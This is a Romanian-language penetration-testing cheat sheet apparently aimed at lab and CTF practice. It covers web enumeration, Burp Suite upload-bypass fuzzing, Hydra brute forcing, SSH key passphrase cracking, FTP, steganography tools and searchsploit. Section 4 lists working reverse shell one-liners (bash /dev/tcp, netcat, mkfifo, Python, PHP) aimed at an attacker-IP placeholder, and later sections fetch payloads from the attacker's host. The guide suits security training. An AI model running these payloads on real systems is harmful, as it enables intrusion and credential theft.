# Cybersecurity & Web Reconnaissance Tools

Ghiduri de referință, comenzi rapide și metodologii de scanare/investigație folosite în evaluarea securității sistemelor și a aplicațiilor web.

---

## 1. Utilitarul `dirb` (Directory & Content Busting)

`dirb` este un scanner de securitate web bazat pe dicționare (*wordlists*). Acesta trimite automat cereri HTTP GET către un server țintă pentru a identifica directoare ascunse, pagini de administrare și fișiere sensibile nespecificate public.

### Sintaxă de Bază
```bash
dirb http://<IP_SAU_DOMENIU>/
```

Exemplu simplu:
```bash
dirb [http://10.10.10.10/](http://10.10.10.10/)
```

---

### Opțiuni și Flag-uri Frecvente

* **Scanare cu un dicționar specific (Wordlist custom):**
  ```bash
  dirb [http://10.10.10.10/](http://10.10.10.10/) /usr/share/wordlists/dirb/big.txt
  ```

* **Căutare după extensii specifice de fișiere (`-X`):**
  Adaugă extensiile la fiecare termen testat (esențial pentru scripturi și backup-uri):
  ```bash
  dirb [http://10.10.10.10/](http://10.10.10.10/) -X .php,.txt,.html,.bak
  ```

* **Ignorarea anumitor coduri de răspuns HTTP (`-N`):**
  Ascunde codurile de eroare care poluează ecranul:
  ```bash
  dirb [http://10.10.10.10/](http://10.10.10.10/) -N 403
  ```

* **Salvarea rezultatelor într-un fișier text (`-o`):**
  ```bash
  dirb [http://10.10.10.10/](http://10.10.10.10/) -o scan_results.txt
  ```

* **Scanare non-interactivă / Silent (`-w`):**
  Nu oprește scanarea la avertismente generice ale serverului:
  ```bash
  dirb [http://10.10.10.10/](http://10.10.10.10/) -w
  ```

---

## 2. Gobuster

Utilitar rapid scris în Go pentru brute-forcing pe componente web (directoare, fișiere, subdomenii, vhosts). Mult mai rapid decât `dirb` datorită execuției concurente (goroutines).

### Sintaxă de bază (Directory Enumeration)
```bash
gobuster dir -u <URL> -w <WORDLIST>
```
---

### Gobuster Flags

| Flag | Descriere | Exemplu |
| :--- | :--- | :--- |
| `dir` | Modul de căutare directoare și fișiere web | `gobuster dir` |
| `-u` | URL-ul complet al țintei (protocol + host + port) | `-u http://10.10.x.x:3333` |
| `-w` | Calea către fișierul de tip wordlist | `-w /usr/share/wordlists/dirb/common.txt` |
| `-x` | Extensii de fișiere căutate (separate prin virgulă) | `-x php,html,txt` |
| `-t` | Număr de thread-uri concurente (viteză, default: 10) | `-t 50` |
| `-e` | Afișează URL-ul complet în terminal | `-e` |
| `-k` | Ignoră verificarea certificatelor SSL (HTTPS invalid) | `-k` |
| `-o` | Salvează rezultatele într-un fișier text | `-o scan_results.txt` |
| `-s` | Coduri de status HTTP acceptate (whitelist) | `-s "200,204,301,302,307"` |
| `-b` | Coduri de status HTTP ignorate (blacklist) | `-b "403,404"` |
| `-U` | Username pentru HTTP Basic Authentication | `-U admin` |
| `-P` | Parolă pentru HTTP Basic Authentication | `-P secret123` |
| `-c` | Cookie transmis în header-ul fiecărui request | `-c "PHPSESSID=xyz123"` |
| `-p` | Proxy prin care rutezi cererile (ex: Burp Suite) | `-p http://127.0.0.1:8080` |
| `-z` | Nu afișează bara de progres (reduce output-ul) | `-z` |

---


## 3. BurpSuite

Platformă integrată pentru testarea securității aplicațiilor web. Funcționează ca un proxy HTTP/HTTPS de tip Man-in-the-Middle (MitM) între browser și serverul țintă, permițând interceptarea, inspectarea, modificarea și automatizarea cererilor.

### Module principale

| Modul | Rol principal | Scenariu de utilizare |
| :--- | :--- | :--- |
| **Proxy** | Interceptează traficul HTTP/HTTPS în timp real | Modificarea parametrilor din formulare, headere, cookie-uri înainte de a ajunge pe server |
| **Repeater** | Retrimite cereri individuale modificate manual | Testare rapidă pentru SQLi, XSS, bypass-uri de logare fără a reîncărca pagina în browser |
| **Intruder** | Automatizează atacuri personalizate și fuzzing | Brute-force pe parole/directoare, testare de extensii de fișiere (file upload bypass), IDOR |
| **Target** | Maparea structurii site-ului (Site Map) | Vizualizarea arborelui complet de endpoint-uri, directoare și parametri descoperiți |
| **Decoder** | Encodare/decodare rapidă de date | URL encoding, Base64, Hex, HTML entities direct în GUI |

---

### Tipuri de atac în Intruder

* **Sniper:** Folosește un singur set de payload-uri. Dacă sunt marcate mai multe poziții (`§...§`), le testează pe rând, pe fiecare poziție independent.
* **Battering Ram:** Folosește un singur set de payload-uri, dar inserează **aceeași valoare** în toate pozițiile marcate simultan la fiecare request.
* **Pitchfork:** Folosește seturi diferite de payload-uri pentru fiecare poziție, iterând prin liste în paralel (linie cu linie: payload1 din lista A cu payload1 din lista B).
* **Cluster Bomb:** Folosește seturi diferite de payload-uri pentru fiecare poziție și testează **toate permutările posibile** (produs cartezian, ideal pentru username + password brute-force).

---

### Workflow rapid: File Upload Extension Bypass (Intruder)

1. **Setare Proxy:** În browser (Firefox în Kali), navighează prin proxy (`127.0.0.1:8080` sau extensia FoxyProxy).
2. **Interceptare:** În Burp $\rightarrow$ tab-ul **Proxy** $\rightarrow$ asigură-te că butonul arată `Intercept is on`.
3. **Upload de test:** Încarcă un fișier din browser. În Burp va apărea cererea `POST /cale/upload`.
4. **Trimitere la Intruder:** Click dreapta în cerere $\rightarrow$ **Send to Intruder** (sau `Ctrl + I`).
5. **Setare poziție (Tab-ul Positions):**
   * Selectează modul de atac: **Sniper**.
   * Apasă butonul **Clear §**.
   * Evidențiază doar extensia fișierului în header-ul cererii (ex: `filename="shell§.php§"`) și apasă **Add §**.
6. **Setare payload (Tab-ul Payloads):**
   * Payload type: **Simple list**.
   * Încarcă un dicționar cu extensii (ex: `.php`, `.php3`, `.php4`, `.php5`, `.phtml`).
7. **Execuție și analiză:**
   * Apasă **Start Attack**.
   * Sortează rezultatele după coloana **Length** sau **Status** pentru a identifica răspunsurile care deviază de la eroarea clasică (indică acceptarea fișierului pe server).

---

### 4. Metode de Trimitere și Realizare a unui Reverse Shell

Odată ce listener-ul este activat pe mașina de Kali, atacatorul trebuie să forțeze mașina țintă (prin intermediul unei vulnerabilități precum RCE, SQLi, Command Injection etc.) să execute un payload care inițiază conexiunea înapoi.

Există multiple tipuri de payload-uri (Reverse Shell One-Liners) în funcție de tehnologiile disponibile pe serverul țintă:

#### A. Reverse Shell prin Bash (Cel mai comun pe Linux)
Dacă ținta rulează un sistem Linux, acesta este cel mai simplu și rapid mod de a trimite o conexiune înapoi:
```bash
bash -i >& /dev/tcp/<IP_ATACATOR>/<PORT> 0>&1
```
*   `bash -i`: Porneste un shell Bash interactiv.
*   `/dev/tcp/...`: Folosește funcționalitatea nativă a Linux de a deschide un socket de rețea direct către IP-ul și portul tău de Kali.

---

#### B. Reverse Shell prin Netcat (nc)
Dacă utilitarul `netcat` este deja instalat pe mașina țintă, poate fi abuzat direct pentru a trimite un shell:

* **Varianta clasică (dacă binarul suportă parametrul `-e`):**
  ```bash
  nc <IP_ATACATOR> <PORT> -e /bin/bash
  ```
  *   `-e /bin/bash`: Redirecționează terminalul Bash direct prin conexiunea de rețea.

* **Varianta de securitate (dacă `-e` este blocat/incompatibil - NC Named Pipe):**
  Multe sisteme moderne au versiuni de netcat care blochează opțiunea `-e` din motive de securitate. Acest lucru se ocolește creând o conductă (pipe) locală:
  ```bash
  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP_ATACATOR> <PORT> >/tmp/f
  ```

---

#### C. Reverse Shell prin Python
Foarte util dacă pe server rulează o aplicație web (cum ar fi Django, Flask) și ai acces la execuție de cod:

* **Sintaxă Python 3:**
  ```bash
  python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP_ATACATOR>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'
  ```

---

#### D. Reverse Shell prin PHP
Standardul de aur în atacurile asupra aplicațiilor web de tip CMS (WordPress, Joomla, etc.) unde poți încărca un fișier malițios:

* **Comandă pe un singur rând (One-Liner):**
  ```php
  php -r '\$sock=fsockopen("<IP_ATACATOR>",<PORT>);exec("/bin/bash -i <&3 >&3 2>&3");'
  ```
* **Fișier Web Shell (.php):**
  Poți urca un script complet (precum celebrul *Pentestmonkey PHP Reverse Shell*) în panoul de administrare al site-ului, iar accesarea URL-ului acelui fișier va declanșa conexiunea către listener-ul tău.

---

### 🛠️ Stabilizarea Shell-ului (Shell Upgrade)

Atunci când primești un Reverse Shell prin `netcat`, terminalul obținut este extrem de instabil (nu funcționează tastele direcționale, `Tab` pentru auto-complete, iar `Ctrl+C` va închide conexiunea complet). Pentru a-l transforma într-un terminal TTY complet:

1. **În interiorul reverse shell-ului primit, rulează Python pentru a spawna un shell curat:**
   ```bash
   python3 -c 'import pty; pty.spawn("/bin/bash")'
   ```
2. **Pune shell-ul în fundal (Background):**
   Apasă combinația de taste `Ctrl + Z`.
3. **În terminalul tău de Kali, configurează transmiterea caracterelor brute și adu shell-ul înapoi în prim-plan:**
   ```bash
   stty raw -echo; fg
   ```
   *(Apasă Enter după ce tastezi asta. Terminalul va părea că s-a blocat sau că e gol).*
4. **Resetează configurația de terminal în shell-ul țintei:**
   ```bash
   export TERM=xterm
   ```
   *După acest pas, scurtăturile din tastatură, culorile și auto-complete-ul vor funcționa normal.*

---

## 5. Enumerare Servicii de Rețea

### enum4linux
Utilizat pentru scanarea și enumerarea detaliată a serviciilor **SMB/Samba** (porturile 139/445) pe sisteme Windows și Linux. Este ideal pentru extragerea numelor de utilizatori și a mapelor partajate.

* **Comandă completă (cu salvare în log):**
  ```bash
  enum4linux -a 10.112.162.101 | tee enum4linux.log
  ```
* **Opțiuni cheie:**
  * `-a` (All): Rulează toate testele de enumerare posibile (utilizatori, grupuri, share-uri, politici).
  * `| tee <fișier>`: Afișează rezultatul în terminal și îl salvează simultan într-un fișier text pentru analiză ulterioară.

---

## 6. Atacuri prin Forță Brută (Brute Forcing)

### Hydra
Unul dintre cele mai rapide și flexibile instrumente pentru spargerea credențialelor (username/parolă) pe diverse protocoale (SSH, SMB, FTP, HTTP Form).

* **Atac pe serviciul SMB (Rețea):**
  Dacă ai aflat un username din `enum4linux`, folosește:
  ```bash
  hydra -l <username> -P /usr/share/wordlists/rockyou.txt ssh://<IP_TINTA>
  ```

* **Atac pe formulare Web (HTTP-POST):**
  ```bash
  hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP_TINTA> http-post-form "/login.php:username=^USER^&password=^PASS^:F=Invalid username" -V
  ```
* **Opțiuni cheie:**
  * `-l` / `-L`: Transmite un singur utilizator (litera mică) sau o listă de utilizatori dintr-un fișier (litera mare).
  * `-p` / `-P`: Transmite o singură parolă (litera mică) sau o listă de parole / wordlist (litera mare).
  * `-V` (Verbose): Afișează în timp real fiecare combinație testată.

---

## 7. Transfer de Fișiere în Laborator

### Python HTTP Server (Sursa)
Cea mai rapidă metodă de a transforma mașina de atac într-un server web temporar pentru a livra scripturi sau payload-uri.
```bash
python3 -m http.server 8000
```

### Metode de descărcare pe mașina țintă
* **Cu Wget:** `wget http://<IP_ATACATOR>:8000/fisier.ext`
* **Cu Curl:** `curl http://<IP_ATACATOR>:8000/fisier.ext -o fisier.ext`

### SCP (Secure Copy)
Folosit pentru a copia fișiere și directoare întregi în siguranță între mașina de atac și serverul țintă, utilizând conexiunea SSH existentă.

* **Comanda de bază (Pentru a descărca un folder întreg de pe server pe Kali):**
  ```bash
  scp -r <username>@<IP_TINTA>:/cale/catre/folder_server /cale/destinatie/local_kali
  ```

* **Comanda de bază (Pentru a urca un fișier de pe Kali pe server):**
  ```bash
  scp /cale/fisier_local <username>@<IP_TINTA>:/cale/destinatie/server
  ```

#### ⚙️ Flag-uri utilizate:
* `-r` : Copiază recursiv (obligatoriu dacă vrei să transferi directoare întregi cu tot cu fișierele din ele).

#### ⚠️ Depanare: Conexiune respinsă pe mașini vechi (Legacy Systems)
Dacă mașina de laborator este învechită, este foarte probabil ca utilitarul `scp` modern de pe Kali să refuze conexiunea cu eroarea: *„no matching host key type found. Their offer: ssh-rsa”*. 

Pentru a debloca transferul, forțează activarea algoritmilor criptografici legacy adăugând manual următoarele opțiuni:

```bash
scp -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedKeyTypes=+ssh-rsa -r <username>@<IP_TINTA>:/cale/server /cale/local/
```

---

## 8. Scripturi de Enumerare Automată (Post-Exploatare)

Aceste unelte sunt colecții de comenzi Bash automate care auditează sistemul local pentru a găsi vectori de Privilege Escalation.

* **`linpeas.sh`**: Cel mai avansat script; caută configurări greșite generalizate. Textul **roșu pe fundal galben** indică o vulnerabilitate aproape sigură.
* **`lse.sh` (Linux Smart Enumeration)**: Filtrează rezultatele în funcție de nivelul de detalii dorit (opțiunea `-l 0` arată doar erorile critice).
* **`LinEnum.sh`**: Unealtă clasică și foarte stabilă pentru un sumar curat al drepturilor Sudo și SUID.

---

## 9. Conectarea prin SSH cu Cheie Privată

Atunci când ai obținut o cheie privată (ex: `root_key` sau `id_rsa`), o poți folosi pentru a obține acces direct pe server fără a mai introduce o parolă de utilizator.

* **Comanda de bază:**
  ```bash
  ssh -i /cale/catre/cheie_privata username@<IP_TINTA>
  ```

#### ⚙️ Pași Obligatorii și Flag-uri:
1. **Modificarea permisiunilor (Critic):** Înainte de conectare, fișierul cheii trebuie restricționat. Dacă permisiunile sunt prea deschise, clientul SSH va refuza execuția din motive de securitate:
   ```bash
   chmod 600 /cale/catre/cheie_privata
   ```
2. `-i` : Specifică fișierul de identitate (cheia privată).

#### ⚠️ Depanare: Conexiune pe mașini vechi (Legacy Systems)
Dacă serverul de laborator este învechit, clienții SSH moderni de pe Kali vor bloca conexiunea din cauza algoritmilor criptografici depășiți (`ssh-rsa`). Pentru a forța compatibilitatea, adaugă manual acești parametri:

```bash
ssh -i /cale/catre/cheie_privata -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa username@<IP_TINTA>
```

---

## 10. Spargerea Parolelor Cheilor SSH (SSH Passphrase Cracking)

Dacă încerci să folosești cheia privată și sistemul îți solicită o parolă (*passphrase*), înseamnă că acea cheie este criptată. Putem sparge această parolă offline folosind **John the Ripper**.

Deoarece John nu poate citi direct fișierul cheii, atacul se realizează în doi pași:

### Pasul 1: Conversia cheii în Hash (`ssh2john`)
Transformăm cheia privată într-un format text (hash) pe care John îl poate procesa:
```bash
python3 /usr/share/john/ssh2john.py root_key > cheie.hash
```
*(Notă: Pe unele sisteme comanda globală poate fi apelată direct prin `ssh2john root_key > cheie.hash`)*.

### Pasul 2: Atacul de tip Dicționar cu John
Rulăm procesul de brute-force offline folosind lista clasică de parole `rockyou.txt`:
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt cheie.hash
```

### Pasul 3: Afișarea parolei identificate
Dacă John a găsit o potrivire în dicționar, poți revedea parola extrasă oricând rulând:
```bash
john --show cheie.hash
```

---

---

## 11. Extragerea de Date prin FTP (File Transfer Protocol)

Protocolul FTP (portul implicit 21) este utilizat frecvent în laboratoare pentru exfiltrarea sau descărcarea de fișiere de pe mașina țintă.

* **Conectarea de bază la serverul FTP:**
  ```bash
  ftp <IP_TINTA>
  ```
  *Sistemul va solicita introducerea unui username și a unei parole.*

* **Descărcarea unui singur fișier (După ce te-ai conectat):**
  ```ftp
  get nume_fișier.extensie
  ```

* **Descărcarea mai multor fișiere simultan (Multi-get):**
  ```ftp
  mget *
  ```

#### ⚙️ Comenzi interne esențiale în prompt-ul FTP:
* `ls` / `dir` : Listează fișierele și directoarele disponibile pe serverul FTP.
* `cd <director>` : Schimbă folderul curent de pe server.
* `binary` : Comandă extrem de importantă rulată înainte de descărcare pentru a forța transferul în mod binar (asigură că imaginile, arhivele sau binarele executabile nu se corup în timpul transferului).
* `ascii` : Schimbă modul de transfer pentru fișiere text simple (modul implicit).
* `prompt` : Dezactivează confirmarea interactivă (Yes/No) pentru fiecare fișier în parte atunci când folosești `mget *`.
* `exit` / `quit` : Închide sesiunea FTP și te întoarce în terminalul Linux.

#### 💡 Trucuri utile în laboratoarele TryHackMe:
1. **Autentificarea Anonimă (Anonymous Login):** Multe servere FTP configurate greșit în laboratoare permit logarea fără cont valid. Când sistemul îți cere username, scrie `anonymous` sau `ftp`, iar la parolă apasă pur și simplu **Enter** (lasă gol).
2. **Unde ajung fișierele?** Fișierele descărcate prin comanda `get` sau `mget` vor apărea local în folderul de pe mașina ta Kali **din care ai rulat comanda inițială** `ftp <IP_TINTA>`.


---


## 12. Enumerare și Extragere de Date prin `curl` (Client URL)

Protocolul HTTP/HTTPS (porturile implicite **80/443**) este principala poartă de acces în aplicațiile web. Utilitarul `curl` este folosit pentru a interacționa rapid cu serverul direct din terminal.

* **Trimiterea unei cereri HTTP simple (GET):**
  ```bash
  curl http://<IP_TINTA>/
  ```
  *Afișează codul sursă HTML al paginii direct în terminal.*

* **Vizualizarea antetelor de răspuns (HTTP Headers):**
  ```bash
  curl -I http://<IP_TINTA>/
  ```
  *Afișează doar metadatele serverului (tipul de server, versiunea, cookie-urile setate).*

* **Modificarea antetului User-Agent (User-Agent Spoofing):**
  ```bash
  curl -H "User-Agent: <NUME_AGENT>" http://<IP_TINTA>/
  ```
  *Trimite un header personalizat pentru a ocoli filtrele care restricționează accesul în funcție de browser sau agent.*

* **Urmărirea automată a redirecționărilor web:**
  ```bash
  curl -L http://<IP_TINTA>/
  ```
  *Forțează utilitarul să urmărească codurile de status 301/302 și să afișeze pagina finală la care ești trimis.*

* **Salvarea conținutului paginii sau a unui fișier la distanță:**
  ```bash
  curl -o fisier_salvat.html http://<IP_TINTA>/pagina.php
  ```
  *Descarcă și salvează output-ul serverului într-un fișier local specificat.*

* **Vizualizarea întregului trafic (Modul Verbose):**
  ```bash
  curl -v http://<IP_TINTA>/
  ```
  *Afișează atât cererea trimisă de tine (request), cât și răspunsul complet al serverului (response).*


---

## 13. Analiza Steganografică și Extragerea Datelor (Steghide & Binwalk)

După descărcarea fișierelor media (imagini, audio) de pe serverul FTP sau web, tehnicile de steganografie sunt folosite pentru a descoperi date sau arhive ascunse în interiorul acestora.

### 🔍 Utilizarea `steghide`
`steghide` este un instrument folosit pentru a ascunde sau a extrage date confidențiale dintr-un fișier imagine (JPEG, BMP) sau audio (WAV, AU) folosind o parolă (passphrase).

* **Extragerea datelor ascunse dintr-o imagine:**
  ```bash
  steghide extract -sf <nume_imagine.jpg>
  ```
  *Sistemul va solicita introducerea parolei descoperite în fazele anterioare (`-sf` specifică fișierul sursă).*

* **Vizualizarea informațiilor despre fișierul stego (fără extragere):**
  ```bash
  steghide info <nume_imagine.jpg>
  ```
  *Afișează dacă imaginea conține date ascunse, formatul acestora și algoritmul de criptare folosit.*

---

### 📦 Utilizarea `binwalk`
`binwalk` este un instrument de analiză firmware și analiză stego conceput pentru a căuta fișiere înglobate, cod sau imagini de sistem în interiorul unui singur fișier mare.

* **Scanarea unui fișier pentru a detecta date ascunse:**
  ```bash
  binwalk <nume_imagine.jpg>
  ```
  *Analizează semnăturile binare și afișează o listă cu fișierele sau arhivele (ex: `.zip`, `.tar.gz`) ascunse în interior.*

* **Extragerea automată a tuturor fișierelor descoperite:**
  ```bash
  binwalk -e <nume_imagine.jpg>
  ```
  *`-e` (extract) extrage automat tot ce găsește în interiorul fișierului și salvează datele într-un director nou numit `_<nume_imagine>.extracted`.*

* **Extragerea forțată a fișierelor (în caz de erori):**
  ```bash
  binwalk --dd=".*" <nume_imagine.jpg>
  ```
  *Extrage brut toate tipurile de semnături identificate în fișier.*

---

## 14. Căutarea Vulnerabilităților și Exploit-urilor (Searchsploit & CVE)

Când identifici servicii învechite sau versiuni specifice de software în faza de scanare (de exemplu, prin `nmap`), următorul pas este verificarea bazelor de date pentru vulnerabilități cunoscute (CVE) și exploit-uri publice.

### 🔎 Ce este `searchsploit`?
`searchsploit` este o unealtă în linie de comandă pentru **Exploit Database (Exploit-DB)**, permițându-ți să cauți exploit-uri stocate local pe mașina ta de Kali Linux, fără a avea nevoie de conexiune la internet.

---

### 🔥 Comenzi Esențiale `searchsploit`

* **Căutarea de bază după numele serviciului și versiune:**
  ```bash
  searchsploit <nume_serviciu> <versiune>
  ```
  *Exemplu: `searchsploit openssh 7.2`. Returnează o listă cu exploit-uri (scripturi Python, cod C, module Metasploit) și căile lor.*

* **Căutarea exactă după un cod CVE (Common Vulnerabilities and Exposures):**
  ```bash
  searchsploit --cve CVE-XXXX-XXXX
  ```
  *Filtrează baza de date locală direct după identificatorul unic al vulnerabilității.*

* **Copierea unui exploit în directorul curent de lucru:**
  ```bash
  searchsploit -m <id_exploit_sau_cale>
  ```
  *`-m` (mirror) copiază automat scriptul găsit direct în folderul tău, fără a fi nevoie să navighezi manual prin directoarele sistemului.*

* **Examinarea codului sursă al unui exploit (fără a-l copia):**
  ```bash
  searchsploit -x <id_exploit_sau_cale>
  ```
  *`-x` (examine) deschide conținutul scriptului direct în terminal pentru a-i citi instrucțiunile sau comentariile (foarte util pentru a vedea ce parametri cere).*

* **Actualizarea bazei de date locale de exploit-uri:**
  ```bash
  searchsploit -u
  ```
  *Sincronizează baza locală cu cele mai noi exploit-uri apărute pe Exploit-DB.*

---

### 🚀 Executarea Exploit-urilor Python (`.py`) descărcate

După ce ai identificat și copiat un exploit local (cum este celebrul `46635.py` pentru vulnerabilitatea SQLi CVE-2019-9053), trebuie să îl configurezi și să îl rulezi indicând calea corectă din server.

#### 1. Identificarea versiunii corecte de Python
Multe exploit-uri din Exploit-DB sunt scrise în versiuni mai vechi. Dacă primești eroarea `SyntaxError: Missing parentheses in call to 'print'`, scriptul necesită **Python 2**.

#### 2. Sintaxa corectă de rulare (Specificarea URL-ului complet)
Dacă rulezi exploit-ul doar pe adresa IP de bază, acesta poate raporta că a găsit vulnerabilitatea, dar va lăsa câmpurile goale (`username found: [gol]`). Este obligatoriu să îi pasezi directorul sau pagina exactă unde rulează aplicația web vulnerabilă:

```bash
python2 46635.py -u http://<IP_TINTA>/pagina
```

*Dacă aplicația se află într-un subdirector specificat în faza de enumerare (ex: Gobuster), comanda va arăta astfel:*
```bash
python2 46635.py -u http://10.10.10.X/simple/
```

#### 3. Automatizarea spargerii parolei direct din exploit
Multe scripturi complexe de SQLi (inclusiv `46635.py`) acceptă parametri suplimentari pentru a trimite hash-ul extras direct către un wordlist local, salvând timp:

```bash
python2 46635.py -u http://<IP_TINTA>/simple/ --crack -w /usr/share/wordlists/rockyou.txt
```
*   `--crack`: Indică scriptului să încerce decriptarea hash-ului imediat ce este extras din baza de date.
*   `-w`: Specifică calea către dicționarul de parole (`rockyou.txt`).


